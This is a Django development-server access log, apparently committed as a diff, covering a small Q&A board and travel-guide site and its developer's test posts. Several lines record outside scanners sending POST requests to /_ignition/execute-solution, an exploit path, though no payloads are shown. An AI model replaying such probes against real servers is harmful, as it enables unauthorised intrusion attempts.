+[12/Mar/2021 21:39:59] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:40:04] "GET /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 21:40:04] "GET /common/login/?next=/pybo/question/create/ HTTP/1.1" 200 3377
+Not Found: /favicon.ico
+[12/Mar/2021 21:40:04] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:40:06] "GET /common/signup/ HTTP/1.1" 200 3718
+Not Found: /favicon.ico
+[12/Mar/2021 21:40:06] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:40:29] "POST /common/signup/ HTTP/1.1" 302 0
+[12/Mar/2021 21:40:29] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 21:40:33] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:40:35] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+Not Found: /favicon.ico
+[12/Mar/2021 21:40:35] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:40:38] "GET /common/logout/ HTTP/1.1" 302 0
+[12/Mar/2021 21:40:38] "GET /pybo HTTP/1.1" 301 0
+[12/Mar/2021 21:40:38] "GET /pybo/ HTTP/1.1" 200 4475
+[12/Mar/2021 21:40:40] "GET /common/login/ HTTP/1.1" 200 3355
+Not Found: /favicon.ico
+[12/Mar/2021 21:40:40] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:40:43] "POST /common/login/ HTTP/1.1" 302 0
+[12/Mar/2021 21:40:44] "GET /pybo HTTP/1.1" 301 0
+[12/Mar/2021 21:40:44] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:40:45] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+Not Found: /favicon.ico
+[12/Mar/2021 21:40:46] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:40:48] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 21:40:48] "GET /pybo/ HTTP/1.1" 200 4961
+[12/Mar/2021 21:40:50] "GET /pybo/31/ HTTP/1.1" 200 4112
+Not Found: /favicon.ico
+[12/Mar/2021 21:40:50] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:40:57] "GET /pybo/question/modify/31/ HTTP/1.1" 200 3265
+Not Found: /favicon.ico
+[12/Mar/2021 21:40:57] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:41:13] "POST /pybo/question/modify/31/ HTTP/1.1" 302 0
+[12/Mar/2021 21:41:13] "GET /pybo/31/ HTTP/1.1" 200 4475
+[12/Mar/2021 21:41:14] "GET /media/images/20214112/%ED%8F%AC%ED%95%AD-%ED%95%98%EC%B0%BD%EB%9E%98.jpg HTTP/1.1" 200 38446
+[12/Mar/2021 21:41:22] "GET /pybo/question/delete/31/ HTTP/1.1" 302 0
+[12/Mar/2021 21:41:22] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:41:27] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+Not Found: /favicon.ico
+[12/Mar/2021 21:41:27] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:41:30] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:41:32] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 21:41:34] "GET /hotplaces/ HTTP/1.1" 200 8209
+[12/Mar/2021 21:41:35] "GET /static/ns.jpg HTTP/1.1" 200 187222
+[12/Mar/2021 21:41:35] "GET /static/jt.jpg HTTP/1.1" 200 177873
+[12/Mar/2021 21:41:35] "GET /static/to.jpg HTTP/1.1" 200 238569
+[12/Mar/2021 21:41:35] "GET /static/kb.jpg HTTP/1.1" 200 312630
+[12/Mar/2021 21:41:35] "GET /static/md.jpg HTTP/1.1" 200 375956
+[12/Mar/2021 21:41:35] "GET /static/bd.jpg HTTP/1.1" 200 440629
+Not Found: /humanframe/theme/basic/assets/images/img/pavi_16_16.png
+[12/Mar/2021 21:41:36] "GET /humanframe/theme/basic/assets/images/img/pavi_16_16.png HTTP/1.1" 404 4661
+[12/Mar/2021 21:41:40] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:41:41] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+Not Found: /favicon.ico
+[12/Mar/2021 21:41:41] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:41:57] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:42:00] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:42:04] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:42:13] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:42:15] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:42:19] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 21:43:20] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 21:43:54] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 21:44:06] "GET /hotplaces/ HTTP/1.1" 200 8209
+[12/Mar/2021 21:44:48] "GET /hotplaces/palace/ HTTP/1.1" 200 23978
+Not Found: /favicon.ico
+[12/Mar/2021 21:44:49] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:45:01] "GET /region HTTP/1.1" 301 0
+[12/Mar/2021 21:45:01] "GET /region/ HTTP/1.1" 200 12495
+[12/Mar/2021 21:45:02] "GET /static/ss.jpg HTTP/1.1" 200 46081
+[12/Mar/2021 21:45:02] "GET /static/gj.png HTTP/1.1" 200 3712
+[12/Mar/2021 21:45:02] "GET /static/gw.png HTTP/1.1" 200 3518
+[12/Mar/2021 21:45:02] "GET /static/gb.png HTTP/1.1" 200 3218
+[12/Mar/2021 21:45:02] "GET /static/gn.jpg HTTP/1.1" 200 2535
+[12/Mar/2021 21:45:02] "GET /static/gs.png HTTP/1.1" 200 3054
+[12/Mar/2021 21:45:02] "GET /static/gr.png HTTP/1.1" 200 3017
+[12/Mar/2021 21:45:02] "GET /static/gc.png HTTP/1.1" 200 3646
+[12/Mar/2021 21:45:02] "GET /static/gd.png HTTP/1.1" 200 2993
+[12/Mar/2021 21:45:02] "GET /static/nw.png HTTP/1.1" 200 3738
+[12/Mar/2021 21:45:02] "GET /static/db.png HTTP/1.1" 200 2898
+[12/Mar/2021 21:45:02] "GET /static/dm.png HTTP/1.1" 200 3238
+[12/Mar/2021 21:45:02] "GET /static/dj.png HTTP/1.1" 200 3758
+[12/Mar/2021 21:45:02] "GET /static/mp.png HTTP/1.1" 200 2800
+[12/Mar/2021 21:45:02] "GET /static/sc.png HTTP/1.1" 200 2888
+[12/Mar/2021 21:45:02] "GET /static/sd.png HTTP/1.1" 200 2937
+[12/Mar/2021 21:45:02] "GET /static/sb.png HTTP/1.1" 200 3643
+[12/Mar/2021 21:45:02] "GET /static/sp.png HTTP/1.1" 200 2730
+[12/Mar/2021 21:45:02] "GET /static/yc.png HTTP/1.1" 200 4013
+[12/Mar/2021 21:45:02] "GET /static/jn.png HTTP/1.1" 200 3537
+[12/Mar/2021 21:45:02] "GET /static/yp.png HTTP/1.1" 200 3368
+[12/Mar/2021 21:45:02] "GET /static/ep.png HTTP/1.1" 200 5199
+[12/Mar/2021 21:45:02] "GET /static/ys.png HTTP/1.1" 200 2991
+[12/Mar/2021 21:45:02] "GET /static/jg.png HTTP/1.1" 200 2856
+[12/Mar/2021 21:45:02] "GET /static/jr.png HTTP/1.1" 200 3413
+Not Found: /favicon.ico
+[12/Mar/2021 21:45:02] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:45:09] "GET /hotplaces HTTP/1.1" 301 0
+[12/Mar/2021 21:45:09] "GET /hotplaces/ HTTP/1.1" 200 8209
+[12/Mar/2021 21:45:17] "GET /hotplaces/myeongdong/ HTTP/1.1" 200 23228
+Not Found: /favicon.ico
+[12/Mar/2021 21:45:18] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:47:01] "GET /hotplaces/palace/ HTTP/1.1" 200 23978
+[12/Mar/2021 21:47:52] "GET /region/ HTTP/1.1" 200 12495
+[12/Mar/2021 21:48:43] "GET /introduction HTTP/1.1" 301 0
+[12/Mar/2021 21:48:43] "GET /introduction/ HTTP/1.1" 200 10157
+[12/Mar/2021 21:48:51] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 21:48:52] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[12/Mar/2021 21:56:17] "GET / HTTP/1.1" 200 12907
+Not Found: /favicon.ico
+[12/Mar/2021 21:56:17] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:56:22] "GET /pybo/ HTTP/1.1" 200 4475
+[12/Mar/2021 21:56:25] "GET /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 21:56:25] "GET /common/login/?next=/pybo/question/create/ HTTP/1.1" 200 3377
+[12/Mar/2021 21:56:27] "GET /common/signup/ HTTP/1.1" 200 3718
+/root/FinalProject_complete/common/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+March 11, 2021 - 20:58:56
+Django version 3.1.5, using settings 'finalproject.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[12/Mar/2021 21:58:49] "GET /common/signup/ HTTP/1.1" 200 3714
+[12/Mar/2021 22:02:25] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 22:02:28] "GET /pybo/ HTTP/1.1" 200 4475
+[12/Mar/2021 22:02:32] "GET /pybo/23/ HTTP/1.1" 200 3848
+[12/Mar/2021 22:02:36] "GET /pybo/30/ HTTP/1.1" 200 3966
+[12/Mar/2021 22:05:14] "GET /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 22:05:15] "GET /common/login/?next=/pybo/question/create/ HTTP/1.1" 200 3377
+[12/Mar/2021 22:05:19] "POST /common/login/ HTTP/1.1" 302 0
+[12/Mar/2021 22:05:19] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[12/Mar/2021 22:05:24] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 22:05:24] "GET /pybo/ HTTP/1.1" 200 4964
+[12/Mar/2021 22:05:25] "GET /pybo/32/ HTTP/1.1" 200 4124
+[12/Mar/2021 22:05:26] "GET /pybo/question/modify/32/ HTTP/1.1" 200 3276
+[12/Mar/2021 22:05:27] "GET /pybo/question/delete/32/ HTTP/1.1" 302 0
+[12/Mar/2021 22:05:27] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 22:09:57] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 22:09:58] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[12/Mar/2021 22:10:00] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 22:10:00] "GET /pybo/ HTTP/1.1" 200 4973
+[12/Mar/2021 22:10:01] "GET /pybo/33/ HTTP/1.1" 200 4149
+[12/Mar/2021 22:10:02] "GET /pybo/question/delete/33/ HTTP/1.1" 302 0
+[12/Mar/2021 22:10:02] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 22:14:35] "GET /pybo/30/ HTTP/1.1" 200 4266
+[12/Mar/2021 22:17:04] "GET /pybo/30/ HTTP/1.1" 200 4273
+[12/Mar/2021 22:17:05] "GET /pybo/question/delete/30/ HTTP/1.1" 302 0
+[12/Mar/2021 22:17:05] "GET /pybo/ HTTP/1.1" 200 4040
+[12/Mar/2021 22:17:09] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[12/Mar/2021 22:17:16] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 22:17:16] "GET /pybo/ HTTP/1.1" 200 4506
+[12/Mar/2021 22:17:17] "GET /pybo/34/ HTTP/1.1" 200 4165
+[12/Mar/2021 22:17:18] "GET /pybo/question/delete/34/ HTTP/1.1" 302 0
+[12/Mar/2021 22:17:18] "GET /pybo/ HTTP/1.1" 200 4040
+[12/Mar/2021 22:18:22] "GET /pybo/ HTTP/1.1" 200 4040
+[12/Mar/2021 22:18:22] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[12/Mar/2021 22:18:25] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 22:18:25] "GET /pybo/ HTTP/1.1" 200 4506
+[12/Mar/2021 22:18:26] "GET /pybo/35/ HTTP/1.1" 200 4192
+[12/Mar/2021 22:18:28] "GET /pybo/question/delete/35/ HTTP/1.1" 302 0
+[12/Mar/2021 22:18:28] "GET /pybo/ HTTP/1.1" 200 4040
+[12/Mar/2021 22:18:29] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[12/Mar/2021 22:18:34] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[12/Mar/2021 22:18:37] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 22:18:37] "GET /pybo/ HTTP/1.1" 200 4512
+[12/Mar/2021 22:18:37] "GET /pybo/36/ HTTP/1.1" 200 4165
+[12/Mar/2021 22:18:38] "GET /pybo/question/modify/36/ HTTP/1.1" 200 3308
+[12/Mar/2021 22:18:43] "GET /pybo/question/delete/36/ HTTP/1.1" 302 0
+[12/Mar/2021 22:18:43] "GET /pybo/ HTTP/1.1" 200 4040
+[12/Mar/2021 22:20:24] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[12/Mar/2021 22:20:26] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 22:20:26] "GET /pybo/ HTTP/1.1" 200 4506
+[12/Mar/2021 22:20:27] "GET /pybo/37/ HTTP/1.1" 200 4183
+[12/Mar/2021 22:20:29] "GET /pybo/question/delete/37/ HTTP/1.1" 302 0
+[12/Mar/2021 22:20:29] "GET /pybo/ HTTP/1.1" 200 4040
+[12/Mar/2021 22:22:11] "GET /pybo/ HTTP/1.1" 200 4040
+[12/Mar/2021 22:22:11] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[12/Mar/2021 22:22:13] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[12/Mar/2021 22:22:13] "GET /pybo/ HTTP/1.1" 200 4506
+[12/Mar/2021 22:22:14] "GET /pybo/38/ HTTP/1.1" 200 4257
+[12/Mar/2021 22:22:21] "GET /pybo/question/delete/38/ HTTP/1.1" 302 0
+[12/Mar/2021 22:22:21] "GET /pybo/ HTTP/1.1" 200 4040
+[12/Mar/2021 23:22:05] code 400, message Bad request version ('À\x14À')
+[12/Mar/2021 23:22:05] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[12/Mar/2021 23:22:06] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[12/Mar/2021 23:54:07] "GET / HTTP/1.1" 200 12907
+Not Found: /favicon.ico
+[12/Mar/2021 23:54:08] "GET /favicon.ico HTTP/1.1" 404 4529
+[13/Mar/2021 00:12:14] "GET / HTTP/1.1" 200 12907
+[13/Mar/2021 00:12:20] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:12:23] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:12:26] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:12:26] "GET /pybo/ HTTP/1.1" 200 4500
+[13/Mar/2021 00:12:27] "GET /pybo/39/ HTTP/1.1" 200 4276
+[13/Mar/2021 00:12:30] "GET /pybo/question/delete/39/ HTTP/1.1" 302 0
+[13/Mar/2021 00:12:30] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:12:41] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:12:45] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:12:45] "GET /pybo/ HTTP/1.1" 200 4504
+[13/Mar/2021 00:12:46] "GET /pybo/40/ HTTP/1.1" 200 4277
+[13/Mar/2021 00:12:48] "GET /pybo/question/delete/40/ HTTP/1.1" 302 0
+[13/Mar/2021 00:12:48] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:13:48] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:17:01] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:17:02] "GET /pybo/ HTTP/1.1" 200 4503
+[13/Mar/2021 00:17:03] "GET /pybo/41/ HTTP/1.1" 200 4443
+[13/Mar/2021 00:17:07] "GET /pybo/question/delete/41/ HTTP/1.1" 302 0
+[13/Mar/2021 00:17:07] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:18:46] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:18:47] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:18:48] "GET /pybo/ HTTP/1.1" 200 4503
+[13/Mar/2021 00:18:48] "GET /pybo/42/ HTTP/1.1" 200 4200
+[13/Mar/2021 00:18:51] "GET /pybo/question/delete/42/ HTTP/1.1" 302 0
+[13/Mar/2021 00:18:51] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:20:57] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:20:57] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:21:02] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:21:03] "GET /pybo/ HTTP/1.1" 200 4500
+[13/Mar/2021 00:21:05] "GET /pybo/43/ HTTP/1.1" 200 4192
+[13/Mar/2021 00:21:08] "GET /pybo/question/delete/43/ HTTP/1.1" 302 0
+[13/Mar/2021 00:21:09] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:21:46] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:21:50] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:21:50] "GET /pybo/ HTTP/1.1" 200 4503
+[13/Mar/2021 00:21:50] "GET /pybo/44/ HTTP/1.1" 200 4246
+[13/Mar/2021 00:21:55] "GET /pybo/question/delete/44/ HTTP/1.1" 302 0
+[13/Mar/2021 00:21:55] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:23:45] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:23:47] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:23:47] "GET /pybo/ HTTP/1.1" 200 4506
+[13/Mar/2021 00:23:48] "GET /pybo/45/ HTTP/1.1" 200 4295
+[13/Mar/2021 00:23:50] "GET /pybo/question/delete/45/ HTTP/1.1" 302 0
+[13/Mar/2021 00:23:50] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:24:13] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:24:14] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:24:19] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:24:20] "GET /pybo/ HTTP/1.1" 200 4500
+[13/Mar/2021 00:24:21] "GET /pybo/46/ HTTP/1.1" 200 4349
+[13/Mar/2021 00:24:24] "GET /pybo/question/delete/46/ HTTP/1.1" 302 0
+[13/Mar/2021 00:24:24] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:37:26] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:37:27] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:37:29] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:37:30] "GET /pybo/ HTTP/1.1" 200 4506
+[13/Mar/2021 00:37:32] "GET /pybo/47/ HTTP/1.1" 200 4176
+[13/Mar/2021 00:37:35] "GET /pybo/question/modify/47/ HTTP/1.1" 200 3305
+[13/Mar/2021 00:37:37] "GET /pybo/question/delete/47/ HTTP/1.1" 302 0
+[13/Mar/2021 00:37:39] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:37:41] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 00:37:43] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:37:43] "GET /pybo/ HTTP/1.1" 200 4503
+[13/Mar/2021 00:37:44] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 00:37:45] "GET /pybo/ HTTP/1.1" 200 4966
+[13/Mar/2021 00:37:46] "GET /pybo/49/ HTTP/1.1" 200 4167
+[13/Mar/2021 00:37:50] "GET /pybo/question/delete/49/ HTTP/1.1" 302 0
+[13/Mar/2021 00:37:50] "GET /pybo/ HTTP/1.1" 200 4503
+[13/Mar/2021 00:37:51] "GET /pybo/48/ HTTP/1.1" 200 4167
+[13/Mar/2021 00:37:52] "GET /pybo/question/delete/48/ HTTP/1.1" 302 0
+[13/Mar/2021 00:37:53] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 00:40:00] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 01:30:50] "GET / HTTP/1.1" 200 12907
+[13/Mar/2021 01:45:21] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03ø\x07tç[%¢\x91!\x87á\x98ßÌ.\x14²\x7féÛ¦M¹µ\r\x93&-\x1b$v8\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[13/Mar/2021 01:45:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[13/Mar/2021 01:45:21] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[13/Mar/2021 02:33:58] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03Ô\x1d\x9dÝ4Ó¤°:\x9f\x0bú^V\x81!Yº²½iD\x15ð/\x17Ü\x9ef_l7\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[13/Mar/2021 02:33:58] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[13/Mar/2021 02:33:58] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[13/Mar/2021 02:52:42] code 400, message Bad request syntax ("\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03à\x1fû\x95[¬Å\x01<5\x91\x86;\x07ùY\x03FáTD\x01uu\x1fPf!'\xad\x9fè\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À")
+[13/Mar/2021 02:52:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[13/Mar/2021 02:52:42] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[13/Mar/2021 04:35:18] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03üºv\x91\x8fH²ã\x91\x9d\x9f\x02Ñbéxô1}\tÞ\x0f\x97øS\x9a\x1b\xad\x8fëºr\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[13/Mar/2021 04:35:18] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[13/Mar/2021 04:35:18] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[13/Mar/2021 06:03:56] code 400, message Bad request version ('À\x14À')
+[13/Mar/2021 06:03:56] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[13/Mar/2021 09:36:21] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03\x83\x87Ù\x89ÓHÖVV¾2¸öe¾\x99¥Z\x17K¡h\x0c:|\x9cñ\x85z\x9bRÕ\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[13/Mar/2021 09:36:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[13/Mar/2021 09:36:21] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[13/Mar/2021 09:55:23] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03\x02/\x87;\x06\x7fIí¸\x99 û\x84\x84cîcU¯wÃ¨;Fò\t2\x0b5\x81ÿi\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[13/Mar/2021 09:55:23] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[13/Mar/2021 09:55:23] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[13/Mar/2021 12:23:39] code 400, message Bad request version ('À\x14À')
+[13/Mar/2021 12:23:39] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[13/Mar/2021 12:23:41] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[13/Mar/2021 13:23:12] "GET / HTTP/1.1" 200 12907
+Not Found: /favicon.ico
+[13/Mar/2021 13:23:12] "GET /favicon.ico HTTP/1.1" 404 4529
+[13/Mar/2021 13:23:14] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 13:23:17] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 13:23:19] "GET / HTTP/1.1" 200 12907
+[13/Mar/2021 13:52:55] "GET /pybo/ HTTP/1.1" 200 4040
+[13/Mar/2021 13:52:58] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 13:53:03] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[13/Mar/2021 13:53:06] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[13/Mar/2021 13:53:06] "GET /pybo/ HTTP/1.1" 200 4499
+[13/Mar/2021 13:53:07] "GET /pybo/50/ HTTP/1.1" 200 4254
+[13/Mar/2021 13:53:12] "GET /pybo/question/delete/50/ HTTP/1.1" 302 0
+[13/Mar/2021 13:53:12] "GET /pybo/ HTTP/1.1" 200 4040
